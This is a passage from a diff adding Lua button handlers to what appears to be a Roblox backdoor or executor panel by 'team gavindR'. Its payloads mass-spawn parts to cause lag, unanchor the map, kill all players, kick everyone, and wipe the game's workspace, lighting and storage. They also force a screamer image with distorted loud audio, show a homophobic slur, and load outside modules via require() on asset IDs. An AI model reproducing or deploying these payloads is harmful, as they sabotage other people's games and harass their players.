+
+-- Waktu jeda setiap spawn
+local spawnDelay = 0.02
+
+while true do
+	task.wait(spawnDelay)
+
+	-- buat part
+	local p = Instance.new("Part")
+	p.Anchored = false
+	p.CanCollide = true
+
+	-- ukuran random (10–50)
+	local size = math.random(10, 500)
+	p.Size = Vector3.new(size, size, size)
+
+	-- posisi random di atas
+	local X = math.random(-Xrange, Xrange)
+	local Z = math.random(-Zrange, Zrange)
+	p.Position = Vector3.new(X, height, Z)
+
+	-- shape random
+	p.Shape = Shapes[math.random(1, #Shapes)]
+
+	-- warna random
+	p.Color = Color3.fromRGB(
+		math.random(0,255),
+		math.random(0,255),
+		math.random(0,255)
+	)
+
+	-- material random
+	p.Material = Materials[math.random(1, #Materials)]
+
+	p.Parent = workspace
+
+	-- auto-destroy setelah jatuh
+	task.delay(15, function()
+		if p then p:Destroy() end
+	end)
+end
+]]
+Cody.Text = prg
+ExecutePayload()
+end)
+
+bf('unchored all', function() 
+local una = [[
+local Players = game:GetService("Players")
+
+for _, obj in pairs(workspace:GetDescendants()) do
+	if obj:IsA("BasePart") then
+		local isPlayerPart = false
+
+		-- Cek apakah part milik karakter player
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Character and obj:IsDescendantOf(player.Character) then
+                isPlayerPart = true
+                break
+            end
+        end
+
+		-- Kalau bukan milik player → unanchor
+		if not isPlayerPart then
+			obj.Anchored = false
+		end
+	end
+end
+]]
+Cody.Text = una
+ExecutePayload()
+end)
+
+bf('anouncement script', function()
+local m = [=[
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+
+---------------------------------
+-- FUNCTION BUAT ANNOUNCEMENT --
+---------------------------------
+
+local function Announce()
+	for _, v in pairs(Players:GetPlayers()) do
+		local gui = Instance.new("ScreenGui")
+		gui.Name = "AnnouncementGui"
+		gui.ResetOnSpawn = false
+		gui.Parent = v.PlayerGui
+
+		local frame = Instance.new("Frame")
+		frame.Size = UDim2.new(1, 0, 0, 150)
+		frame.Position = UDim2.new(0, 0, 1, 0) -- mulai dari bawah
+		frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+		frame.BackgroundTransparency = 0.35
+		frame.Parent = gui
+
+		local MSG = [==[
+team gavindR join today
+toko34315, dipayy24, Zarchiver7z, NB5UA
+Virus will add in this game ,Pada percaya lu😂
+]==]
+
+		local text = Instance.new("TextLabel")
+		text.Size = UDim2.new(1, 0, 1, 0)
+		text.BackgroundTransparency = 1
+		text.TextColor3 = Color3.fromRGB(255,255,255)
+		text.Font = Enum.Font.GothamBold
+		text.TextSize = 32
+		text.TextWrapped = true
+		text.Text = MSG
+		text.Parent = frame
+
+		-- Tween masuk
+		local tweenIn = TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {
+			Position = UDim2.new(0, 0, 0.55, 0)
+		})
+		tweenIn:Play()
+
+		tweenIn.Completed:Wait()
+		task.wait(5)
+
+		-- Tween keluar
+		local tweenOut = TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {
+			Position = UDim2.new(0, 0, 1, 0)
+		})
+		tweenOut:Play()
+
+		tweenOut.Completed:Wait()
+
+		gui:Destroy()
+	end
+end
+
+Announce()
+]=]
+Cody.Text = m
+ExecutePayload()
+end)
+
+bf('Kill All', function()
+local B = [[
+local Players = game:GetService("Players")
+local g = Instance.new("Message",workspace)
+g.Text = "get killed LOLOLOLOLOLOL"
+for _, plr in ipairs(Players:GetPlayers()) do
+	if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+		local hum = plr.Character.Humanoid
+
+		task.spawn(function()
+			while hum.Health > 0 do
+				hum.Health = math.max(hum.Health - 8, 0) -- kecepatan bunuh
+				task.wait(0.07) -- makin kecil = makin cepat
+			end
+		end)
+	end
+end
+wait(0.6)
+g:Destroy()
+]]
+Cody.Text = B
+ExecutePayload()
+end)
+bf('shutdown/kick all', function()
+local KI = [=[
+for _,plr in ipairs(game.Players:GetPlayers()) do
+	pcall(function()
+		plr:Kick("Shutdown ed by gavindR")
+	end)
+end
+]=]
+Cody.Text = KI
+ExecutePayload()
+end)
+
+bf('gavindR realm', function()
+local r = [===[
+
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local StarterGui = game:GetService("StarterGui")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local RS = game:GetService("ReplicatedStorage")
+
+for _, s in ipairs(workspace:GetDescendants()) do
+	if s:IsA("Sound") then
+		pcall(function()
+			if s and s.Parent then
+				s:Stop()
+				task.wait(0.01)
+				
+				-- Lepas dulu dari parent biar tidak error saat destroy
+				s.Parent = nil
+				task.wait(0.01)
+				
+				s:Destroy()
+			end
+		end)
+	end
+end
+
+for _, obj in ipairs(workspace:GetChildren()) do
+	if not Players:GetPlayerFromCharacter(obj)
+		and obj.Name ~= "Camera"
+		and obj.Name ~= "Terrain" then
+		obj:Destroy()
+	end
+end
+for _, obj in ipairs(Lighting:GetChildren()) do
+	obj:Destroy()
+end
+for _, obj in ipairs(workspace.Terrain:GetChildren()) do
+	obj:Destroy()
+end
+for _, obj in ipairs(RS:GetChildren()) do
+	obj:Destroy()
+end
+workspace.Terrain:Clear()
+
+for _, plr in ipairs(Players:GetPlayers()) do
+	local pg = plr:FindFirstChild("PlayerGui")
+	if pg then
+		for _, gui in ipairs(pg:GetChildren()) do
+			if gui.Name ~= "TouchGui" then
+				gui:Destroy()
+			end
+		end
+	end
+end
+for _, gui in ipairs(StarterGui:GetChildren()) do
+	gui:Destroy()
+end
+local function screamer(plr)
+	if plr:WaitForChild("PlayerGui"):FindFirstChild("Screamer") then return end
+
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "Screamer"
+	gui.IgnoreGuiInset = true
+	gui.ResetOnSpawn = false
+	gui.DisplayOrder = 10000
+	gui.Parent = plr.PlayerGui
+
+	local iimg = Instance.new("ImageLabel")
+	iimg.Parent = gui
+	iimg.Size = UDim2.new(1,0,1,0)
+	iimg.BackgroundTransparency = 0 -- FIX
+	iimg.Image = "rbxassetid://113665607881195"
+
+	-- Sound
+	local s = Instance.new("Sound", gui)
+	s.SoundId = "rbxassetid://9069609200"
+	s.Volume = 10
+	Instance.new("DistortionSoundEffect", s).Level = 0.9
+	s:Play()
+	task.wait(9.5)
+	gui:Destroy()
+end
+
+for _, plr in ipairs(Players:GetPlayers()) do
+	task.spawn(screamer, plr)
+end
+
+Players.PlayerAdded:Connect(screamer)
+for _,plr in pairs(Players:GetPlayers()) do
+	if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+		plr.Character.Humanoid.Health = 0
+	end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+	player.CameraMode = Enum.CameraMode.LockFirstPerson
+end
+
+Players.PlayerAdded:Connect(function(player)
+	player.CameraMode = Enum.CameraMode.LockFirstPerson
+	player.CharacterAdded:Connect(function()
+		player.CameraMode = Enum.CameraMode.LockFirstPerson
+	end)
+end)
+
+local baseplate = Instance.new("Part")
+baseplate.Size = Vector3.new(1000,15,1000)
+baseplate.Anchored = true
+baseplate.Color = Color3.fromRGB(110,110,112)
+baseplate.Name = "@/#)($+$-$b"
+baseplate.Parent = workspace
+
+local h = Instance.new("SpawnLocation")
+h.Anchored = true
+h.Transparency = 1
+h.Size = Vector3.new(8,1,8)
+h.Position = Vector3.new(0,7,-20)
+h.Parent = workspace
+
+local d = Instance.new("Decal")
+d.Texture = "rbxassetid://113665607881195"
+d.Face = Enum.NormalId.Top
+d.Parent = h
+
+local board = Instance.new("Part")
+board.Anchored = true
+board.Transparency = 1
+board.Size = Vector3.new(19.889999389648438, 12.5, 1)
+board.Position = Vector3.new(-32,13,0)
+board.Parent = workspace
+
+local gui = Instance.new("SurfaceGui", board)
+gui.Face = Enum.NormalId.Front
+
+local txt = Instance.new("TextLabel", gui)
+txt.Size = UDim2.new(1,0,0.5,0)
+txt.BackgroundTransparency = 1
+txt.TextScaled = true
+txt.TextStrokeTransparency = 0
+txt.TextColor3 = Color3.new(1,1,1)
+txt.Text = [[
+THE GAVINDR'S REALM BY TEAM gavindR 
+]]
+local txt = Instance.new("TextLabel", gui)
+txt.Size = UDim2.new(1,0,0.5,0)
+txt.Position = UDim2.new(0,0,0.5,0)
+txt.BackgroundTransparency = 1
+txt.TextScaled = true
+txt.TextStrokeTransparency = 0
+txt.TextColor3 = Color3.new(1,1,1)
+txt.Text = [=[
+whats up faggot this game just got hacked i guess enjoy your little tour
+]=]
+local skyId = "rbxassetid://113665607881195"
+local sky = Instance.new("Sky", Lighting)
+sky.SkyboxBk = skyId
+sky.SkyboxDn = skyId
+sky.SkyboxFt = skyId
+sky.SkyboxLf = skyId
+sky.SkyboxRt = skyId
+sky.SkyboxUp = skyId
+
+local h = Instance.new("Part")
+h.Anchored = true
+h.Transparency = 0
+h.Size = Vector3.new(17,0.3,27)
+h.Position = Vector3.new(0,8,20)
+h.Parent = workspace
+
+local d = Instance.new("Decal")
+d.Texture = "rbxassetid://290658294"
+d.Face = Enum.NormalId.Top
+d.Parent = h
+
+local yh = Instance.new("Part")
+yh.Anchored = true
+yh.Transparency = 1
+yh.Size = Vector3.new(19,20,1)
+yh.Position = Vector3.new(0,20,29)
+yh.Parent = workspace
+
+local d = Instance.new("Decal")
+d.Texture = "rbxassetid://71586752776874"
+d.Face = Enum.NormalId.Front
+d.Parent = yh
+
+local music = Instance.new("Sound")
+music.SoundId = "rbxassetid://1842791717" -- original sound 1839246711
+music.Volume = 10
+music.PlaybackSpeed = 1
+music.Looped = true
+music.Parent = workspace
+local reverb = Instance.new("ReverbSoundEffect", music) 
+reverb.DecayTime = 1.5      -- lama gema
+reverb.Density = 1        -- kepadatan gema
+reverb.Diffusion = 1
+reverb.DryLevel = -6     -- suara asli
+task.delay(9.5, function()
+	music:Play()
+end)
+require(12507245664)()
+require(10264050121)()
+require(6958877234)()
+]===]
+Cody.Text = r
+ExecutePayload()
+end)
